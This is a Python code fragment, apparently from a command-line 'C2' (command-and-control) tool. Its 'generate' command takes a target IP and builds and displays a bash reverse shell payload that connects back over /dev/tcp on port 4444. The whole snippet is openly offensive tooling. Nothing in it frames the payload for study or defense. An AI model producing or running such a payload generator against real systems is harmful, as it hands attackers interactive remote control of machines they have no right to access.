@c2.command()
@click.option('--target', '-t', required=True, help='Target IP')
@click.option('--type', 'payload_type', default='reverse_shell', help='Payload type')
def generate(target, payload_type):
    """Generate C2 payload"""
    console.print(f"[bold green]🎯 Generating {payload_type} payload...[/bold green]\n")
    
    payload = f"#!/bin/bash\nbash -i >& /dev/tcp/{target}/4444 0>&1"
    
    console.print(Panel(
        f"[cyan]{payload}[/cyan]",
        title="Generated Payload",
        border_style="cyan"
    ))


